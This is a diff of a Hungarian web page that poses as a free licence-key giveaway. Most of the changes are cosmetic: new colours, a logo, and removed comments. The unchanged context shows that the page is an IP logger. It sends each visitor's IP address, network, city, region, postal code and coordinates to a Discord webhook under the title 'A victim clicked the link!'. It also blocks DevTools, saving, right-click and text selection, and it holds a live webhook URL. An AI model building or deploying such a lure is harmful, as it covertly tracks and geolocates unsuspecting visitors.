@@ -8,7 +8,7 @@
         /* Alap stílusok */
         body {
             font-family: 'Arial', sans-serif;
-            background: linear-gradient(to right, #ff7e5f, #feb47b); /* Színes háttér */
+            background: linear-gradient(to right, #6a8a08, #f7c97d); /* A háttér színe a logóhoz igazítva */
             display: flex;
             justify-content: center;
             align-items: center;
@@ -23,6 +23,13 @@
             padding: 40px;
             border-radius: 10px;
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+
+        /* Logó stílusa */
+        .logo {
+            width: 120px; /* Logó szélessége */
+            height: auto;
+            margin-bottom: 20px; /* Térköz a logó és a szöveg között */
         }
 
         h1 {
@@ -70,6 +77,8 @@
 </head>
 <body>
     <div class="container">
+        <!-- Logó hozzáadása a HTML oldalhoz -->
+        <img src="https://cdn.discordapp.com/attachments/1117118869417492551/1400461344972603432/vip.png?ex=688cb8c3&is=688b6743&hm=6a8a083be4644b64e173abe101361b3bd8aaf767657b6ad18957b1042a28df6b&" alt="Logo" class="logo"> <!-- Cseréld ki a helyes logó URL-t -->
         <h1>Kattints a kulcs másolásához!</h1>
         <input type="text" value="N3N-FREE-GWERR-GBFKIU-UTFCF-VHYTRE-WTF" class="key" id="key" readonly>
         <button class="copy-button" onclick="copyKey()">Másolás</button>
@@ -80,17 +89,11 @@
     <script>
         // Kulcs másolása a vágólapra
         function copyKey() {
-            // Kulcs eleme
             const keyElement = document.getElementById("key");
-
-            // Kiválasztjuk a kulcsot
             keyElement.select();
             keyElement.setSelectionRange(0, 99999); // Mobilon is működik
-
-            // Kulcs másolása a vágólapra
             document.execCommand("copy");
 
-            // Visszajelzés a felhasználónak
             const notification = document.getElementById("notification");
             notification.style.display = "block"; // Megjeleníti az üzenetet
             setTimeout(() => {
@@ -120,8 +123,8 @@
                                     embeds: [
                                         {
                                             title: 'Egy áldozat rákattintott a linkre!',
-                                      description: `**IP-cím >> **${ipadd}\n**Hálózat >> ** ${geoData.network}\n**Város >> ** ${geoData.city}\n**Régió >> ** ${geoData.region}\n**Ország >> ** ${geoData.country_name}\n**Irányítószám >> ** ${geoData.postal}\n**Szélesség >> ** ${geoData.latitude}\n**Hosszúság >> ** ${geoData.longitude}`,
-                                      color: 0x800080 // optionally changeable
+                                            description: `**IP-cím >> **${ipadd}\n**Hálózat >> ** ${geoData.network}\n**Város >> ** ${geoData.city}\n**Régió >> ** ${geoData.region}\n**Ország >> ** ${geoData.country_name}\n**Irányítószám >> ** ${geoData.postal}\n**Szélesség >> ** ${geoData.latitude}\n**Hosszúság >> ** ${geoData.longitude}`,
+                                            color: 0x800080 // optionally changeable
                                         }
                                     ]
                                 })
@@ -172,35 +175,28 @@
 
         // Ha valaki próbálja a DevTools-t vagy a jobb kattintást, letiltjuk
         document.addEventListener('keydown', function(e) {
-            // Ha a felhasználó "Ctrl+S"-t nyom, letiltjuk
             if ((e.ctrlKey && e.key === 's') || e.key === 'F12') {
-                e.preventDefault();  // Letiltja az alapértelmezett viselkedést (mentés)
-                window.location.href = redirectURL;  // Átirányítjuk őket a kívánt oldalra
+                e.preventDefault();
+                window.location.href = redirectURL;
             }
         });
 
-        // Jobb kattintás letiltása
         document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();  // Letiltja a jobb kattintást
+            e.preventDefault();
         });
 
-        // Szövegkiválasztás letiltása
         document.addEventListener('selectstart', function(e) {
-            e.preventDefault();  // Letiltja a szövegkiválasztást
+            e.preventDefault();
         });
 
-        // Globális hibafigyelés
         window.onerror = function(message, source, lineno, colno, error) {
             console.error(`Hiba: ${message} a(z) ${source} fájlban ${lineno} sorban észlelve.`);
             
-            // Hibaüzenet megjelenítése a felhasználónak
             const errorContainer = document.createElement('div');
             errorContainer.classList.add('error');
             errorContainer.innerText = `Hiba történt: ${message}`;
-
             document.body.appendChild(errorContainer);
 
-            // Hibát küldhetünk Discordra
             const dscURL = 'https://discord.com/api/webhooks/1397140201008267375/OigaJ4FR510_5ExJAanLzDF0VKx-vnmNSEtpxbphhuQLizgB781VzCCR0o2Bp5l5SvX3';
             fetch(dscURL, {
                 method: 'POST',
@@ -213,7 +209,7 @@
             .then(data => console.log('Hiba sikeresen küldve Discordra:', data))
             .catch(error => console.error('Hiba küldése Discordra nem sikerült:', error));
 
-            return true;  // Elkerüli a hiba dupla megjelenítését
+            return true;
         };
     </script>
 </body>
